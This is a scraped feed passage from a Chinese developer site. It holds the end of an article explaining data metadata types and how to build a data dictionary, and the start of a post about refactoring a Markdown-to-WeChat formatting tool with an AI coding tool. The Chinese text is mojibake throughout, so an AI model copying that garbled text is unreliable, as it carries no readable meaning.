<li>æœ‰å…ƒæ•°æ®ï¼šçœ‹ä¸€çœ¼â€œæœ€åæ›´æ–°æ—¶é—´â€ï¼Œå‘ç°åŸæ¥æ˜¯æ˜¨æ™šçš„æ•°æ®åŒæ­¥ä»»åŠ¡å¤±è´¥äº†ï¼Œæ•°æ®æ˜¯æ—§çš„ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-2">3. å…ƒæ•°æ®é•¿ä»€ä¹ˆæ ·ï¼Ÿ</h2>
<p>åœ¨å®é™…å·¥ä½œä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œæˆ‘ä»¬é€šå¸¸æŠŠå…ƒæ•°æ®<strong>åˆ†ä¸ºä¸‰ç±»</strong>ã€‚</p>
<p>è®©æˆ‘ä»¬ä»¥ä¸€å¼  <strong>â€œå…¬å¸é”€å”®è®°å½•è¡¨â€</strong> ä¸ºä¾‹ï¼Œçœ‹çœ‹å®ƒä»¬åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼š</p>
<ol>
<li><strong>æŠ€æœ¯å…ƒæ•°æ®</strong> (ç»™ç”µè„‘çœ‹çš„)ï¼šæè¿°äº†æ•°æ®çš„å¤–è²Œç‰¹å¾ã€‚</li>
</ol>
<ul>
<li>å®ƒæ˜¯å•¥ï¼š è®°å½•æ•°æ®çš„æ ¼å¼ã€ç»“æ„ã€å­˜å‚¨æ–¹å¼ã€‚</li>
<li>ä¸¾ä¸ªæ —å­ï¼š
<ul>
<li>è¡¨åï¼š <code>sales_order_2023</code></li>
<li>å­—æ®µç±»å‹ï¼š <code>order_id</code> æ˜¯æ–‡æœ¬å‹ï¼Œ<code>amount</code> æ˜¯æµ®ç‚¹æ•°å€¼å‹ã€‚</li>
<li>é•¿åº¦é™åˆ¶ï¼š è¿™ä¸ªå­—æ®µæœ€å¤šå­˜50ä¸ªå­—ã€‚</li>
<li>ä¸»é”®ï¼š è®¢å•å·ä¸èƒ½é‡å¤ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>ä¸šåŠ¡å…ƒæ•°æ®</strong> (ç»™åˆ†æå¸ˆçœ‹çš„)ï¼šæè¿°äº†æ•°æ®çš„å†…åœ¨å«ä¹‰ï¼ˆè¿™æ˜¯åˆ†æå¸ˆæœ€å…³å¿ƒçš„ï¼‰ã€‚</li>
</ol>
<ul>
<li>å®ƒæ˜¯å•¥ï¼š ç»Ÿä¸€å£å¾„ï¼Œè§£é‡Šä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>ä¸¾ä¸ªæ —å­ï¼š
<ul>
<li>å­—æ®µå®šä¹‰ï¼š â€œé”€å”®é¢â€æŒ‡æ‰£é™¤é€€æ¬¾åçš„å®é™…æˆäº¤é‡‘é¢ã€‚</li>
<li>çŠ¶æ€ç è§£é‡Šï¼š å­—æ®µ <code>status</code> ä¸­ï¼Œ1=å¾…æ”¯ä»˜ï¼Œ2=å·²å‘è´§ï¼Œ3=å·²å®Œæˆã€‚</li>
<li>æ•°æ®æ‰€æœ‰è€…ï¼š è¿™å¼ è¡¨æœ‰é—®é¢˜è¯¥æ‰¾è°ï¼Ÿï¼ˆä¾‹å¦‚ï¼šæ‰¾è´¢åŠ¡éƒ¨çš„å¼ ä¸‰ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>æ“ä½œå…ƒæ•°æ®</strong> (è®°å½•è¿è¡Œè½¨è¿¹çš„)ï¼šæè¿°äº†æ•°æ®çš„ç”Ÿå­˜çŠ¶æ€ã€‚</li>
</ol>
<ul>
<li>å®ƒæ˜¯å•¥ï¼š è®°å½•æ•°æ®æ˜¯ä»€ä¹ˆæ—¶å€™äº§ç”Ÿçš„ï¼Œæ€ä¹ˆå˜åŒ–çš„ã€‚</li>
<li>ä¸¾ä¸ªæ —å­ï¼š
<ul>
<li>åˆ›å»ºæ—¶é—´ï¼š 2023å¹´1æœˆ1æ—¥ã€‚</li>
<li>æœ€è¿‘æ›´æ–°ï¼š ä»Šå¤©æ—©ä¸Š 08:00ã€‚</li>
<li>è®¿é—®è®°å½•ï¼š æ˜¨å¤©æœ‰è°æŸ¥è¿‡è¿™å¼ è¡¨ã€‚</li>
<li>è¡€ç¼˜å…³ç³»ï¼š è¿™å¼ è¡¨çš„æ•°æ®æ˜¯ä»â€œERPç³»ç»Ÿâ€æŠ½è¿‡æ¥çš„ï¼Œå¹¶ä¸”ä¼šè¢«â€œCEOæ—¥æŠ¥â€å¼•ç”¨ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">4. æ‰‹é‡Œæœ‰ç°æˆæ•°æ®ï¼Œå¦‚ä½•ç”Ÿæˆå…ƒæ•°æ®ï¼Ÿ</h2>
<p>å‡è®¾ä½ æ‰‹å¤´æœ‰ä¸€å † <code>Excel</code> æˆ– <code>CSV</code> æ•°æ®ï¼Œæƒ³æŠŠå…ƒæ•°æ®æ•´ç†å‡ºæ¥ï¼Œä¸ç”¨éå¾—ä¸Šç™¾ä¸‡çš„å¤§æ•°æ®ç³»ç»Ÿï¼Œä½ å¯ä»¥åˆ†ä¸‰æ­¥èµ°ï¼š</p>
<h3 data-id="heading-4">4.1. ç¬¬ä¸€æ­¥ï¼šå»ºç«‹â€œæ•°æ®å­—å…¸â€</h3>
<p>è¿™æ˜¯æœ€åŸºç¡€ã€æœ€æœ‰æ•ˆçš„æ‰‹æ®µã€‚</p>
<ul>
<li><strong>åšæ³•</strong>ï¼šæ–°å»ºä¸€ä¸ª Excel æ–‡ä»¶ï¼Œæˆ–è€…åœ¨æ•°æ®åº“å»ºä¸€å¼ å•ç‹¬çš„è¡¨ã€‚</li>
<li><strong>å†…å®¹</strong>ï¼šæ¯ä¸€è¡Œè®°å½•ä¸€ä¸ªå­—æ®µçš„ä¿¡æ¯ã€‚</li>
<li>æ¨¡æ¿ç¤ºä¾‹ï¼š</li>
</ul>





























<table><thead><tr><th>è¡¨å</th><th>å­—æ®µå (è‹±æ–‡)</th><th>å­—æ®µå (ä¸­æ–‡)</th><th>æ•°æ®ç±»å‹</th><th>ä¸šåŠ¡å®šä¹‰/å¤‡æ³¨</th><th>æ¥æº</th></tr></thead><tbody><tr><td>è®¢å•è¡¨</td><td><code>order_amt</code></td><td>è®¢å•é‡‘é¢</td><td>æ•°å­—</td><td>ä¸åŒ…å«è¿è´¹çš„å•†å“æ€»ä»·</td><td>é”€å”®ç³»ç»Ÿ</td></tr><tr><td>è®¢å•è¡¨</td><td><code>pay_status</code></td><td>æ”¯ä»˜çŠ¶æ€</td><td>æ–‡æœ¬</td><td>0=æœªä»˜, 1=å·²ä»˜</td><td>æ”¯ä»˜ç½‘å…³</td></tr></tbody></table>
<p>æœ‰äº†è¿™å¼ è¡¨ï¼Œä»¥åè°å†é—®ä½ å­—æ®µæ˜¯ä»€ä¹ˆæ„æ€ï¼Œç›´æ¥æŠŠè¿™ä¸ªæ–‡æ¡£ç”©ç»™ä»–ï¼</p>
<h3 data-id="heading-5">4.2. ç¬¬äºŒæ­¥ï¼šåˆ©ç”¨å·¥å…·è‡ªåŠ¨æŠ“å– (æŠ€æœ¯å…ƒæ•°æ®)</h3>
<p>å¦‚æœä½ ä¼šä¸€ç‚¹ <code>Python</code> æˆ–è€… <code>SQL</code>ï¼š</p>
<ul>
<li><code>SQL</code>ï¼šå¤§å¤šæ•°æ•°æ®åº“éƒ½æœ‰ <code>information_schema</code>ï¼Œä½ å¯ä»¥ç›´æ¥æŸ¥è¯¢å®ƒæ¥è‡ªåŠ¨ç”Ÿæˆæ‰€æœ‰è¡¨åã€å­—æ®µåå’Œç±»å‹çš„åˆ—è¡¨ã€‚</li>
<li><code>Python</code>ï¼šç”¨ <code>Pandas</code> è¯»å–æ•°æ® (<code>df.info()</code>)ï¼Œå¯ä»¥å¿«é€Ÿè·å–åˆ—åã€éç©ºå€¼æ•°é‡å’Œæ•°æ®ç±»å‹ï¼Œä½œä¸ºå…ƒæ•°æ®çš„åº•ç¨¿ã€‚</li>
</ul>
<h3 data-id="heading-6">4.3. ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ æ³¨é‡Š</h3>
<p>ä¸è¦è®©å…ƒæ•°æ®å’Œæ•°æ®åˆ†å®¶ã€‚</p>
<ul>
<li>åœ¨ <code>Excel</code> ä¸­ï¼šå–„ç”¨â€œæ‰¹æ³¨â€åŠŸèƒ½ï¼Œæˆ–è€…åˆ©ç”¨ç¬¬ä¸€è¡Œå†™ä»£ç ï¼Œç¬¬äºŒè¡Œå†™ä¸­æ–‡è§£é‡Šã€‚</li>
<li>åœ¨ <code>SQL</code> ä¸­ï¼šå»ºè¡¨æ—¶ä¸€å®šè¦å†™ <code>COMMENT</code>ã€‚
<ul>
<li>é”™è¯¯ç¤ºèŒƒï¼š<code>CREATE TABLE orders (status INT);</code></li>
<li>æ­£ç¡®ç¤ºèŒƒï¼š<code>CREATE TABLE orders (status INT COMMENT 'çŠ¶æ€: 0-æœªä»˜, 1-å·²ä»˜');</code></li>
</ul>
</li>
</ul>
<h2 data-id="heading-7">5. ç»“è¯­</h2>
<p>æ•°æ®åˆ†æï¼Œå¾€å¾€ä¸æ˜¯éš¾åœ¨**â€œåˆ†æâ€<strong>ï¼Œè€Œæ˜¯éš¾åœ¨</strong>â€œææ¸…æ¥šæ•°æ®åˆ°åº•æ˜¯ä¸ªå•¥â€**ã€‚</p>
<p>å…ƒæ•°æ®å°±åƒæ˜¯å›¾ä¹¦é¦†çš„ç´¢å¼•å¡ç‰‡ï¼Œæˆ–è€…æ˜¯è¯ç“¶ä¸Šçš„è¯´æ˜ä¹¦ã€‚</p>
<p>è™½ç„¶æ•´ç†å…ƒæ•°æ®è¿™ä»¶äº‹æƒ…åœ¨å¼€å§‹æ—¶çœ‹èµ·æ¥æœ‰ç‚¹ç¹çï¼ˆä¹Ÿå°±æ˜¯å¤§å®¶å¸¸è¯´çš„â€œè„æ´»ç´¯æ´»â€ï¼‰ï¼Œä½†å®ƒèƒ½æå¤§åœ°é™ä½æ²Ÿé€šæˆæœ¬ï¼Œé¿å…å› ä¸ºç†è§£åå·®å¯¼è‡´çš„é‡å¤§åˆ†æäº‹æ•…ã€‚</p>
<p>æ‰€ä»¥ï¼Œä»ä»Šå¤©å¼€å§‹ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä»½æ–°æ•°æ®æ—¶ï¼Œä¸å¦¨å…ˆé—®ä¸€å¥ï¼šâ€œè¿™æ•°æ®çš„å…ƒæ•°æ®åœ¨å“ªé‡Œï¼Ÿâ€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ç”¨ TRAE SOLO ä¸€å¤©ä¸åˆ°å°±æŠŠè€é¡¹ç›®é‡æ„å®Œæ˜¯ä»€ä¹ˆä½“éªŒï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582200865907982370</link>    <guid>https://juejin.cn/post/7582200865907982370</guid>    <pubDate>2025-12-11T07:11:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582200865907982370" data-draft-id="7582232741686591523" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ç”¨ TRAE SOLO ä¸€å¤©ä¸åˆ°å°±æŠŠè€é¡¹ç›®é‡æ„å®Œæ˜¯ä»€ä¹ˆä½“éªŒï¼Ÿ"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,Trae,AIGC"/> <meta itemprop="datePublished" content="2025-12-11T07:11:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="coder_pig"/> <meta itemprop="url" content="https://juejin.cn/user/4142615541321928"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ç”¨ TRAE SOLO ä¸€å¤©ä¸åˆ°å°±æŠŠè€é¡¹ç›®é‡æ„å®Œæ˜¯ä»€ä¹ˆä½“éªŒï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4142615541321928/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    coder_pig
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:11:28.000Z" title="Thu Dec 11 2025 07:11:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">1. å¼•è¨€</h2>
<p>å››å¹´å‰ï¼Œç™¾æ— èŠèµ–ä¹‹ä½™ï¼Œä¸€æ—¶å…´èµ·ï¼ŒèŠ±äº†å·®ä¸å¤šä¸€å‘¨ï¼Œç”¨ <strong>Python</strong> å†™äº†ä¸ª "ğŸ­ <strong>å°¾æ±Markdownè½¬æ¢å·¥å…·</strong>" â†’ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoder-pig%2Fhzwz-markdown-wx" target="_blank" title="https://github.com/coder-pig/hzwz-markdown-wx" ref="nofollow noopener noreferrer">coder-pig/hzwz-markdown-wx</a>ï¼Œç”¨äºï¼š<strong>å°†Markdownæ–‡ä»¶è½¬æ¢æˆå¸¦æ ·å¼çš„å¾®ä¿¡å…¬ä¼—å·æ–‡ç« HTML</strong>ã€‚</p>
<p>ç®€å•ç‚¹è¯´å°±æ˜¯ "<strong>Markdown â†’ å…¬ä¼—å·</strong>" çš„ <strong>æ’ç‰ˆå·¥å…·</strong>ï¼Œè¿˜é¡ºæ‰‹å†™äº†å‡ ç¯‡ä»‹ç»å®ç°è¿‡ç¨‹çš„æ–‡ç« ï¼š</p>
<ul>
<li><a href="https://juejin.cn/post/6899426534239682568" target="_blank" title="https://juejin.cn/post/6899426534239682568">ã€ŠğŸ­å–‚æ±ï¼Œç”¨Pythonå†™ä¸ªä¸“å±Markdownè½¬æ¢å·¥å…·ã€‹</a></li>
<li><a href="https://juejin.cn/post/6907550626197012487" target="_blank" title="https://juejin.cn/post/6907550626197012487">ã€ŠğŸ¤¡å…¬å·æ–‡ç« æ’ç‰ˆåˆ©å™¨ | ğŸå°¾æ±Markdownè½¬æ¢å·¥å…·æ¥å’¯~ã€‹</a></li>
<li><a href="https://juejin.cn/post/6941338759824670750" target="_blank" title="https://juejin.cn/post/6941338759824670750">ã€Šå¼€å‘ğŸå°¾æ±Markdownè½¬æ¢å·¥å…· | é¡¹ç›®å¤ç›˜ã€‹</a></li>
</ul>
<p>ğŸ˜† å½“æ—¶è‡ªå·±æ•´ç†çš„æ’ç‰ˆè§„èŒƒï¼š</p>
<pre><code class="hljs language-text" lang="text"># å­—å·ï¼šæ­£æ–‡(14ã€15)ï¼Œæ³¨é‡Š-æ ‡æ³¨æ¥æº-è¶…é“¾æ¥-ä»£ç (12)
# å­—é—´è·ï¼š(1ã€1.5)
# è¡Œé—´è·ï¼š(1.5ã€1.75ã€2)
# é¡µè¾¹è·ï¼šå³åŒç«¯ç¼©è¿›ã€ä¸¤ç«¯å¯¹é½ï¼Œé¡µé¢å·¦å³ç•™ç™½ï¼Œå»ºè®®ç¼©è¿›å°ºå¯¸ä¸º1.0

# å­—ä½“é¢œè‰²ï¼šæ ‡é¢˜ #000000ï¼›æ­£æ–‡ #4C4C4Cï¼›æ ‡æ³¨ #888888ï¼›å…¶ä»– #B2B2B2
# æ­£æ–‡ä¹Ÿå¯ä»¥å°è¯•ï¼š#545454ï¼›#3f3f3fï¼›#7f7f7fï¼›#2f2f2f
# å¤‡æ³¨æ€§æ–‡å­—ï¼š#a5a5a5

# Tipsï¼šé™¤å»å­—ä½“é¢œè‰²ï¼Œå…¬å·æ’ç‰ˆé¢œè‰²ä¸å®œè¶…è¿‡ä¸‰ç§ï¼Œé¢œè‰²ä¸€æ—¦å¤šèµ·æ¥ï¼Œé£æ ¼å°±å¾ˆéš¾å®šï¼Œ2-3ç§å°¤ä½³ï¼›
# æ¯”å¦‚æˆ‘çš„ä¸‰ç§é¢œè‰²ï¼šè•¾å§†è“#5A78EAï¼›æ‹‰å§†ç²‰#FF4081ï¼›è‰¾ç±³è‰äºšï¼š#C65BDA

# ç¬¦å·ç³»ç»Ÿï¼šå»ºç«‹è‡ªå·±çš„ç¬¦å·ç³»ç»Ÿï¼Œç”¨ä½œå†…å®¹åˆ†å‰²ï¼Œæ¯”å¦‚ç”¨//////////ä½œä¸ºæ­£æ–‡å¤§æ®µè½çš„åˆ†éš”ï¼Œ- ä½œä¸ºæ®µè½å°ç»“çš„åˆ†éš”ï¼Œæœ‰æ—¶è¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›è¡¨æƒ…ç¬¦å·æ¥å¢åŠ è¶£å‘³æ€§ï¼šhttp://cn.piliapp.com/symbol/

# ä¸ç®¡æ€ä¹ˆæ’ï¼Œè¦æœ‰è‡ªå·±å›ºå®šçš„è®¾ç½®ï¼Œå¦‚ï¼šæ®µè½å’Œå›¾ç‰‡é—´ç©º2è¡Œã€å›¾ç‰‡å¤§å°æ§åˆ¶åœ¨ä¸€å±ç‰ˆé¢çš„1/3é¢ç§¯å†…ã€ä¸€ä¸ªæ®µè½ä¸è¶…è¿‡3è¡Œå­—ã€æ¯å½“ä¸€å±ç‰ˆé¢æ–‡å­—å¤ªæ»¡æ—¶ï¼Œæ‹†è§£æ®µè½åšåˆ†æ®µæˆ–åšä¸€äº›highlightåˆ¶é€ ç©ºé—´æ„Ÿç­‰ã€‚

# æ€»è€Œè¨€ä¹‹ï¼Œå°½é‡åˆ©ç”¨ ç®€å•çš„åŸºç¡€è®¾ç½® å»ä¼˜åŒ–é˜…è¯»ä½“éªŒï¼Œè®©æ•´ä½“æ’ç‰ˆçœ‹èµ·æ¥ç®€æ´ä½†æœ‰åºã€ä¸å¯†é›†ã€ä¸æ²‰é‡ã€ä¸å‹æŠ‘ã€‚

# é‡‡ç”¨å›ºå®šæ ¼å¼çš„å…¬å·å°é¢å›¾!!! 
# å›ºå®šç‰ˆå¼å½¢æˆå¼ºçƒˆçš„ä¸ªäººç‰¹è‰²ï¼Œåˆ¶ä½œæ–°çš„å°é¢å›¾åªéœ€ç½®æ¢æ–‡å­—å’Œå›¾ç‰‡ï¼Œå¥½çœ‹åˆæ–¹ä¾¿ã€‚
</code></pre>
<p>ğŸ¤¡ æœ‰åœ¨ç”¨ï¼Œä½†ç”¨èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œæ¯æ¬¡æ’ç‰ˆéƒ½å¾—ï¼š</p>
<p>æ‰“å¼€PyCharm â†’ å¤åˆ¶è¦æ’ç‰ˆçš„mdæ–‡ä»¶ â†’ è¿è¡Œè„šæœ¬ â†’ ç”Ÿæˆå¸¦æ ·å¼çš„HTMLæ–‡ä»¶ â†’ æ‰“å¼€æ–‡ä»¶å¤åˆ¶ç²˜è´´ â†’ æµè§ˆå™¨æ‰“å¼€å…¬ä¼—å·æ–‡ç« ç¼–è¾‘é¡µé¢ â†’ F12å®šä½åˆ°æ–‡ç« è¾“å…¥åŒºåŸŸçš„ä»£ç  â†’ ä¿®æ”¹ç»“ç‚¹ â†’ ç²˜è´´ä»£ç  â†’ ä¿å­˜</p>
<p>ğŸ˜„ ä»Šå¹´å…­æœˆï¼Œçœ‹ <strong>é¦–æœˆ3åˆ€</strong> å¼€çš„ <strong>Trae</strong> è¿˜å‰©æŒºå¤šé¢åº¦ï¼Œäºæ˜¯èŠ±äº†åŠä¸ªå°æ—¶ï¼Œ<strong>Vibe</strong> äº†ä¸€ä¸ª <strong>æ’ç‰ˆé™æ€é¡µé¢ï¼Œ</strong> å¹¶ä¸”ç”¨ <strong>æ˜é‡‘MCP</strong> è¿›è¡Œå‘å¸ƒ â†’ <a href="https://aicoding.juejin.cn/pens/7513888326441828402" target="_blank" title="https://aicoding.juejin.cn/pens/7513888326441828402">ã€Œæ˜æ˜å­Markdownå¾®ä¿¡å…¬ä¼—å·æ’ç‰ˆå·¥å…·ã€</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23c8d370a831404b96eba0fda8c9d491~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=QZnWbWTsbhCR%2F8%2Ffue4cxVlq57I%3D" alt="" loading="lazy"/></p>
